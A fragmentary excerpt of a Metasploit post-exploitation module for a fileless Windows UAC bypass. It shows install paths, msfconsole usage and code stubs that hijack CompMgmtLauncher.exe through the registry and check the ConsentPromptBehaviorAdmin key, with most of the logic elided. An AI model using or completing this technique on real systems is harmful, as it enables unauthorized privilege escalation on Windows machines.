...
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_fileless_bypass2.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_fileless_bypass2.rb
...
# msf exploit(handler) > use post/windows/escalate/enigma_fileless_bypass2
# msf post(enigma_fileless_bypass2) > info
# msf post(enigma_fileless_bypass2) > show options
# msf post(enigma_fileless_bypass2) > show advanced options
# msf post(enigma_fileless_bypass2) > set [option(s)]
# msf post(enigma_fileless_bypass2) > exploit
#
# [ HINT ]
...
if arch_check == "C:\\Windows\\SysWOW64"
  ...
  r=''
  vul_serve = "CompMgmtLauncher.exe" # vulnerable soft to be hijacked
  ...
  if datastore['EXEC_COMMAND'] == 'nil'
    ...
    print_status("Hijacking CompMgmtLauncher.exe process!")
    Rex::sleep(1.5)
  end
 ...
 Rex::sleep(4.5)
      ...
      print_good(" exec => Starting CompMgmtLauncher.exe native process...")
...
def ls_stage2
  ...
  if datastore['DEL_REGKEY'] == 'nil'
    ...
    print_status("Revert CompMgmtLauncher.exe process hijack!")
    Rex::sleep(1.5)
  end
...
def ls_stage3
  ...
  vuln_soft = "CompMgmtLauncher.exe" # vulnerable software name
  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
